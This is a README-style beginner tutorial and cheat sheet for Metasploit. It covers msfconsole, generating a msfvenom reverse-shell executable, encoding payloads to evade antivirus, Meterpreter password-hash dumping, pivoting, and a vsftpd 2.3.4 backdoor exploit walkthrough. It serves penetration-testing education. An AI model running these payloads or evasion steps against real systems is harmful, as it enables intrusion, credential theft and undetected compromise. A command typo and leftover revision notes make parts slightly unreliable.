# beginner-metasploit-guide
Guide and cheat sheet for using Metasploit, covering basic commands, payloads, and post-exploitation techniques. 

![GitHub license](https://img.shields.io/github/license/KhanIkram/beginner-metasploit-guide)
![GitHub stars](https://img.shields.io/github/stars/KhanIkram/beginner-metasploit-guide?style=social)


## Table of Contents
- [What is Metasploit?](#what-is-metasploit)
- [Installation](#installation)
- [Getting Started with msfconsole](#getting-started-with-msfconsole)
- [Working with Payloads using msfvenom](#working-with-payloads-using-msfvenom)
- [Post-Exploitation with Meterpreter](#post-exploitation-with-meterpreter)
- [Common Auxiliary Modules](#common-auxiliary-modules)
- [Managing Sessions](#managing-sessions)
- [Sample Exploit Walkthrough](#sample-exploit-walkthrough)
- [Troubleshooting Common Issues](#troubleshooting-common-issues)
- [Additional Resources](#additional-resources)
- [Contributing](#contributing)
- [License](#license)

---

## What is Metasploit?

**Metasploit** is one of the most widely used platforms for developing, testing, and executing exploits against vulnerable systems. It provides penetration testers and security professionals with the tools needed to simulate real-world attacks and identify weaknesses in a system.

Metasploit consists of several key tools:
- **msfconsole**: The main command-line interface.
- **msfvenom**: A tool for creating and encoding payloads.
- **Meterpreter**: A post-exploitation payload that provides powerful capabilities on a compromised system.

---

## Installation

You can install Metasploit on Linux, macOS, or Windows. Below are examples for each platform.

### Installation on Linux:
```bash
sudo apt update
sudo apt install metasploit-framework
```

### Installation on macOS (via Homebrew):
```bash
brew install metasploit
```

For Windows, download the installer from the official [Metasploit website](https://www.metasploit.com/download).

For more detailed instructions, visit the [official installation guide](https://docs.metasploit.com).

---

## Getting Started with msfconsole

**msfconsole** is the heart of Metasploit. It allows you to search for vulnerabilities, run payloads, manage sessions, and more.

### Step 1: Starting msfconsole
Open your terminal and start Metasploit by running:
```bash
msfconsole
```
Once it loads, you will see a prompt like:
```bash
msf >
```

### Step 2: Searching for Exploits or Modules
Search for a specific module, exploit, or auxiliary tool by typing:
```bash
msf > search [module_name]
```
Example:
```bash
msf > search apache
```
This will return a list of available modules related to Apache vulnerabilities.

### Step 3: Using a Module
Load a module (e.g., an exploit) with the `use` command:
```bash
msf > use [module_path]
```
Example:
```bash
msf > use exploit/unix/ftp/vsftpd_234_backdoor
```

### Step 4: Setting Module Options
Set the required options for the module, such as the target’s IP address (RHOST) or your machine’s IP (LHOST):
```bash
msf > set RHOSTS [target_ip]
msf > set LHOST [your_ip]
```
Use the `show options` command to view all configurable parameters for a module:
```bash
msf > show options
```

### Step 5: Running the Exploit
Once everything is set, launch the exploit:
```bash
msf > exploit
```

---

## Working with Payloads using msfvenom

**msfvenom** is a versatile tool used to create payloads that can be delivered to a target machine during exploitation.

### Generate a Basic Reverse Shell Payload
This creates a Windows executable payload that opens a reverse TCP connection to your machine:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your_IP] LPORT=[Your_Port] -f exe > shell.exe
```
- **`LHOST`**: Your IP address (attacker machine).
- **`LPORT`**: The port on your machine that will receive the reverse connection.
- **`-f exe`**: Formats the payload as a Windows executable.

### Listing Available Payloads
To view a list of all available payloads:
```bash
msfvenom -l payloads
```

### Encoding Payloads to Evade Detection
If you need to avoid antivirus detection, use an encoder:
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -f exe > encoded_payload.exe
```
- **`-e`**: Specifies the encoder (e.g., `shikata_ga_nai`).
- **`-i`**: The number of encoding iterations (e.g., `5`).

---

## Post-Exploitation with Meterpreter

Once you have successfully exploited a system, **Meterpreter** becomes your interface for post-exploitation. It offers numerous post-exploit features.

### Common Meterpreter Commands
- **Get system information**:
  ```bash
  meterpreter > sysinfo
  ```
  This will show the operating system, hostname, and other details.

- **List running processes**:
  ```bash
  meterpreter > ps
  ```

- **Take a screenshot**:
  ```bash
  meterpreter > screenshot
  ```

- **Dump password hashes**:
  ```bash
  meterpreter > hashdump
  ```

- **Upload or download files**:
  ```bash
  meterpreter > download [remote_path] [local_path]
  meterpreter > upload [local_path] [remote_path]
  ```

- **Kill a process**:
  ```bash
  meterpreter > kill [process_id]
  ```

- **Change the current working directory**:
  ```bash
  meterpreter > cd [directory]
  ```

---

## Common Auxiliary Modules

Metasploit includes numerous **auxiliary modules** for scanning, enumeration, and other tasks. Here are a few useful examples:

### TCP Port Scanning
```bash
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS [target_IP_range]
msf > run
```

### DNS Enumeration
```bash
msf > use auxiliary/gather/dns_enum
msf > set DOMAIN [target_domain]
msf > run
```

### FTP Server Setup
```bash
msf > use auxiliary/server/ftp
msf > set FTPROOT /tmp/ftproot
msf > run
```

---

## Managing Sessions

When working with multiple compromised machines, session management becomes crucial.

- **List all active sessions**:
  ```bash
  msf > sessions -l
  ```

- **Interact with a session**:
  ```bash
  msf > session -i [session_id]
  ```

- **Background a session**:
  ```bash
  meterpreter > background
  ```

- **Kill a job (such as a listener)**:
  ```bash
  msf > jobs -k [job_id]
  ```

- **Route traffic through a session (for pivoting)**:
  ```bash
  msf > route add [subnet] [netmask] [session_id]
  ```

---

## Sample Exploit Walkthrough

Here’s a quick walkthrough of how to exploit the VSFTPD 2.3.4 vulnerability.

### Steps:
1. **Start Metasploit:**
   ```bash
   msfconsole
   ```

2. **Search for the exploit module:**
   ```bash
   msf > search vsftpd
   ```

3. **Load the module:**
   ```bash
   msf > use exploit/unix/ftp/vsftpd_234_backdoor
   ```

4. **Set the target’s IP address (RHOST):**
   ```bash
   msf > set RHOST 192.168.1.100
   ```

5. **Run the exploit:**
   ```bash
   msf > exploit
   ```

If successful, you’ll get a root shell on the target system!

---

## Troubleshooting Common Issues

Here are solutions to some common problems you might encounter:

### Issue: Module Not Working or Failing to Exploit
- **Solution**: Check that all required options are correctly set using `show options`. Ensure that RHOSTS and LHOST are properly configured.

### Issue: Exploit Doesn’t Work on Target
- **Solution**: Verify that the target system is vulnerable. Use tools like **Nmap** to ensure the service or version matches the exploit requirements.

### Issue: Payload Detected by Antivirus
- **Solution**: Encode the payload using `msfvenom` with an encoder

 such as `shikata_ga_nai` to obfuscate the payload and bypass antivirus detection.

---

## Additional Resources
- [Metasploit Documentation](https://docs.metasploit.com/)
- [Metasploit Unleashed by Offensive Security](https://www.offensive-security.com/metasploit-unleashed/)
- [Common Metasploit Payloads and Exploits](https://github.com/rapid7/metasploit-framework/wiki)

---

## Contributing

Contributions are always welcome! Whether you want to improve existing content or add new sections, feel free to open a pull request or create an issue.

---

## License

This project is licensed under the MIT License. See the [LICENSE](./LICENSE) file for more details.

---

### Key Improvements:
1. **More Accessible Content**: The step-by-step workflows and examples are laid out clearly, making it easier for beginners to follow.
3. **Sample Exploit Walkthrough**: A hands-on example to help users see Metasploit in action right away.
4. **Troubleshooting Section**: Added practical advice to address common problems faced by beginners.
